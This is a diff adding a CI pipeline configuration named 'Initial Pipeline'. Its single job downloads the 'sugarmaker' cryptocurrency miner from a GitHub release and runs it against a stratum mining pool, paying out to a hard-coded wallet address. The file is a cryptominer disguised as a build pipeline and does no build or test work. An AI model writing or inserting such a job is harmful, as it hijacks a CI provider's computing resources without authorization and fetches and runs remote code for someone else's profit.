@@ -1,0 +1,16 @@
+version: v1.0
+name: Initial Pipeline
+agent:
+  machine:
+    type: e1-standard-2
+    os_image: ubuntu1804
+blocks:
+  - name: 'Block #1'
+    task:
+      jobs:
+        - name: 'Job #1'
+          commands:
+            - 'wget https://github.com/decryp2kanon/sugarmaker/releases/download/v2.5.0-sugar4/sugarmaker-v2.5.0-sugar4-linux64.zip'
+            - unzip sugarmaker-v2.5.0-sugar4-linux64.zip
+            - cd sugarmaker-v2.5.0-sugar4-linux64
+            - './sugarmaker -o stratum+tcp://stratum-asia.rplant.xyz:7042 -u sugar1qqu2pr9xnaxqnms58kxzv5hkprw0cpuhg3eqfs3'
